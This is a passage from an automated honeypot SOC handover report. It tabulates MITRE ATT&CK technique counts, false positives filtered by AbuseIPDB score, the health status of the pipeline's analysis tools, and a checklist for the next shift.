
| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 46 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 22 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 21 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 489 cases |
| Tool 34  | Credential Extractor        | ✅ 53 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 30 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (2.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 21 priority case(s) shown individually · 21 recon entry/entries in table (9 group(s) consolidating 445 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-28T20:28:57Z_
